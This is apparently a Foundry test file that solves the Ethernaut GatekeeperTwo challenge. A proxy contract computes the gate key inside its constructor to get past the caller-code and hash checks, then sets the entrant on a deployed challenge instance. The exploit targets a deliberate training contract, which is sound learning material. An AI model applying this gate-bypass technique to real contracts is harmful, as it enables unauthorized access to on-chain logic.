// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../GatekeeperTwo.sol";

contract ProxyGatekeeperTwo {
    GatekeeperTwo obj;
    
    constructor(address addr) public {
        obj = GatekeeperTwo(addr);
        console.log("msg sender =", msg.sender);
        bytes8 _gateKey = bytes8((uint64(0) - 1) ^ (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
        obj.enter(_gateKey);
    }
}
contract GatekeeperTwoTest is DSTest {
    GatekeeperTwo obj;
    ProxyGatekeeperTwo proxy_gatekeepertwo;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {
        contract_address = 0xC9ADAB06E1D0FB3ce30969c88d19f4aBD08390eD;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = GatekeeperTwo(contract_address);
        // obj = new GatekeeperTwo();
        // proxy_gatekeepertwo = new ProxyGatekeeperTwo(address(obj));
    }

    function testGatekeeperTwo() public {
        console.log("Proxy GatekeeperTwo Address =", address(proxy_gatekeepertwo));
        // console.log("initial entrant state =", obj.entrant()); 
        // console.log("uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))=", uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))));
        // console.log("uint64(0) - 1 =", uint64(0) - 1);
        // bytes8 _gateKey = bytes8((uint64(0) - 1) ^ (uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))));
        // // console.log("key =", _gateKey);
        // console.log("req =", uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
        // console.log("tx.origin =", tx.origin); 
        console.log("initial entrant state =", obj.entrant()); 
        proxy_gatekeepertwo = new ProxyGatekeeperTwo(address(obj));
        console.log("Proxy GatekeeperTwo Address =", address(proxy_gatekeepertwo));
        console.log("end entrant state =",obj.entrant()); 
        assert(obj.entrant() != address(0)); 
    }
}
